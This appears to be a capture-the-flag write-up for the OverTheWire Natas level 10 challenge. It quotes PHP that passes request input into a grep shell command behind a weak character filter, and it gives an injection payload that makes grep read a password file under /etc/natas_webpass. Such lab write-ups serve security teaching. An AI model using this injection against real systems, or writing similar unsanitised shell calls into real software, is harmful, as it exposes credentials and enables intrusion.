# Natas 10 -> 11

```
http://natas10.natas.labs.overthewire.org
```

```
Username: natas10
```

Same as before, except this time some characters are *illegal*.  

```php
<?
$key = "";

if(array_key_exists("needle", $_REQUEST)) {
    $key = $_REQUEST["needle"];
}

if($key != "") {
    if(preg_match('/[;|&]/',$key)) {
        print "Input contains an illegal character!";
    } else {
        passthru("grep -i $key dictionary.txt");
    }
}
?>
```

This time we can't use `;`, `|` or `&`.  
Let's see what happens if we send something like this:  

```
?needle=-v a
```

Alright, we get words without "a", that means we can still exploit this.  
Let's try this:  
```
?needle=-v%20a%20/etc/natas_webpass/natas11%20
```

\o/



* php
* preg_match
* grep
